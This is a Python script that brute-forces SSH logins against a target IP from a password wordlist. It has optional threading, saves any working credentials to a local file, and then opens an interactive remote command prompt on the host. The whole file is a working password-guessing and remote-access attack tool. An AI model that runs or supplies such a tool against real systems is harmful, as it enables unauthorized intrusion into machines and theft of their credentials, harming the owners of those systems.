import paramiko
import time
import argparse
import os
import sys
import socket
import threading

# CLI Arguments
parser = argparse.ArgumentParser()
parser.add_argument("-IP", help="Specify IP address")
parser.add_argument("-u", help="Specify user")
parser.add_argument("-p", help="Enter Password")
parser.add_argument("-b", help="Bruteforce Passwords", action="store_true")
parser.add_argument("-w", help="Wordlist to use as bruteforce")
parser.add_argument("-k", help="Specify your /home/user/.ssh/known_hosts")
parser.add_argument("-t", help="Specify amount of threads")
parser.add_argument('-e',"--example", help="\nExample: python3 script.py -IP 10.10.10.10 -u user -p password123 -k /home/user/.ssh/known_hosts")
# Process Arguments
args = parser.parse_args()

threads = []


class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

isDead = False
	

IP = args.IP
user = args.u
passwd = args.p
threadV = args.t

if len(sys.argv) < 2:
    parser.print_usage()
    sys.exit('')

if not args.k:
	sys.exit('Specify your host keys -k /home/user/.ssh/known_hosts')

if args.b and not args.w:
	sys.exit('Must specify a wordlist too')

client = paramiko.SSHClient()

client.load_host_keys(str(args.k))
client.load_system_host_keys()


client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

def bruteforceSSH(host, wordlistpass, user):
	client = paramiko.SSHClient()

	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		client.connect(host, username=user, password=wordlistpass, banner_timeout=200, timeout=5, auth_timeout=5)

	except paramiko.BadHostKeyException:
		return False

	except paramiko.AuthenticationException:
		print('Invalid Credentials Continuing')
		return False

	except paramiko.SSHException:
		print('Error with establishing SSH session')
		return False

	else:
		print(f'''
	-- VALID CREDS --
	Username - {user}
	Password - {wordlistpass}
			''')
		return True


def hostAvailable(host, port):
	print('Any connection that takes more than 5 seconds is unreachable. ENTER A VALID IP ADDRESS!!!')
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		result = sock.connect_ex((host, port))
		if result == 0:
			print(f'Port {port} - SSH is open')
		else:
			print(f'Port {port} - is not SSH therefore you cannot continue.')
			sys.exit()
	except socket.gaierror:
		sys.exit('Host IP is invalid')

	except socket.timeout:
		sys.exit('Host is unreachable')

def ssh_banner():
	hostAvailable(IP, 22)
	os.system('clear')
	print(color.RED + f'-- BRUTEFORCING SSH ---' + color.BOLD + color.END)
	print('\033[39m')
	print(f'''
IP - {IP}
Wordlist - {args.w}
User - {user}
		''')
	print(color.RED + f'----------------------' + color.BOLD + color.END)
	print('\033[39m')

def ssh_threaded():
	global isDead
	password = args.w
	passwordlist = open(password).read().splitlines()
	for passwords in passwordlist:
		time.sleep(0.1)
		if bruteforceSSH(IP, passwords, user):
			with open("sshcreds.txt", "w") as f:
				f.write(f'IP - {IP} User - {user} Password - {passwords}')
				isDead = True
			sys.exit()

if args.b and args.w and args.t:
	print('The paramiko SSHclient is not thread-safe. Meaning errors will happen in the multi-threaded bruteforce depending on how much the target machine can handle(Recommended Threads - 5). \nIgnore the errors if they do show up.')
	print("Once the program ends you should have a file sshcreds.txt in your local working directory. If not the machine can't handle it so try lowering the amount of threads.")
	time.sleep(8)
	start = time.perf_counter()
	ssh_banner()
	if isDead is not True:
		for i in range(int(threadV)):
			t = threading.Thread(target=ssh_threaded)
			threads.append(t)

		for i in range(int(threadV)):
			threads[i].start()

		for i in range(int(threadV)):
			threads[i].join()
	else:
		sys.exit()

	finish = time.perf_counter()
	print(color.BOLD + f'Finished in {round(finish-start, 2)} seconds. \n Check your local working directory.' + color.BLUE + color.END)

if args.b and args.w:
	print('Standard mode is slower than multi-threaded but no errors should show up')
	time.sleep(2)
	start = time.perf_counter()
	ssh_banner()
	password = args.w
	passwordlist = open(password).read().splitlines()
	for passwords in passwordlist:
		time.sleep(0.1)
		if bruteforceSSH(IP, passwords, user):
			with open("sshcreds.txt", "w") as f:
				f.write(f'IP - {IP} User - {user} Password - {passwords}')
			sys.exit(color.BOLD + 'Process Complete. \n Check your local working directory' + color.END)
	finish = time.perf_counter()
	print(color.BOLD + f'Finished in {round(finish-start, 2)} seconds. \n Check your local working directory.' + color.BLUE + color.END)
	

client.connect(IP, username=str(user), password=str(passwd))


while True:
	try:

		#client.exec_command('hostname')
		cmd = input(color.BOLD + f'REMOTE-{IP}$ ' + color.END)
		# Initialize Commands
		stdin, stdout, stderr = client.exec_command(cmd)

		#Export clear command
		if cmd == "clear".strip():
			os.system('clear')

		
		# Print output of command. Will wait for command to finish.
		print(f'{stdout.read().decode("utf8")}', end="")
		print(f'{stderr.read().decode("utf8")}', end="")

	except KeyboardInterrupt:
		sys.exit('\nRemote Connection Closed')

	except:
		print('Unexpected Error.')




stdin.close()
stdout.close()
stderr.close()
client.close()
